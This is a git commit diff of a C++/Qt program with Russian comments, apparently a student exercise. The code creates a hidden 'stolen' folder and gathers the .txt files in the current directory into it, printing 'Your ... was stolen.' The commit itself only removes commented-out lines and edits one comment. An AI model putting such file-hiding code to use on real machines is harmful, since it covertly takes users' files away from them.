3cbd3674c37049f0dd73aa1c2793190f48164fba
Krilll <43990419+Krilll@users.noreply.github.com>
2018-11-27 22:03:00 +0300

    Update main.cpp

--- 4/main.cpp
+++ 4/main.cpp
@@ -15,12 +15,10 @@ int main(int argc, char *argv[])
     char* buffer = new char[MAX_PATH]; //создаем переменную, в которую затем запишем путь
     GetCurrentDirectoryA(MAX_PATH,buffer); //получаем путь к папке, в которой содержится файл
     //CharToOemA(buffer, buffer); //преобразует из кодировки ANSI в OEM (если в названии пути есть русские буквы)
-   // cout << buffer << endl;//для отладки
 
     //создаем скрытую папку в данной директории, куда будем перемещать файлы
     QString folder = QString(buffer) + "/stolen"; //путь к папке и ее имя
 
-//////////////////////////////TODO
     if (QDir(folder).exists() != true) { //если папки с именем stolen нет в данной директории
             QDir().mkdir(folder); //создаем папку
     }
@@ -31,17 +29,13 @@ int main(int argc, char *argv[])
     attributes = GetFileAttributesA(folderRid); //получаем атрибуты
     attributes = attributes + FILE_ATTRIBUTE_HIDDEN;
     //FILE_ATTRIBUTE_HIDDEN = Файл или каталог скрытые
-    //FILE_ATTRIBUTE_SYSTEM = Файл или каталог - частично или исключительно используются  операционной системой.
     SetFileAttributesA(folderRid, attributes);//устанавливает новые атрибуты для папки (делаем ее скрытой)
-    //folder = QString(folderRid);
 
     //получаем файлы, которые находятся в данной директории
-    //QString path = buffer;
     QDir dir(buffer); //получаем текущий путь и "открываем" папку
     QStringList nameFilter; // имя фильтра
     nameFilter << "*.txt"; //указываем, что хотим получить только .txt
     QStringList allFiles = dir.entryList(nameFilter,  QDir::Files); // сохраняем имена файлов сюда и говорим, что хотим найти только .txt файлы
-    //QFileInfoList list = dir.entryInfoList( nameFilter, QDir::Files );//еще один вариант предыдущего
     QString fileInfo; //сюда будем считывать элементы (имена файлов)
 
     foreach (fileInfo, allFiles) {
@@ -67,7 +61,7 @@ int main(int argc, char *argv[])
            } else {
            cout << "Не удалось открыть текстовый файл. Возможно, в папке нет ни одного текстового файла";
        }
-       cout << "Your " << fileInfo.toStdString() << " was stolen." << endl; //для отладки
+       cout << "Your " << fileInfo.toStdString() << " was stolen." << endl; //для вывода сообщений в консоли
     }
 
     return a.exec();
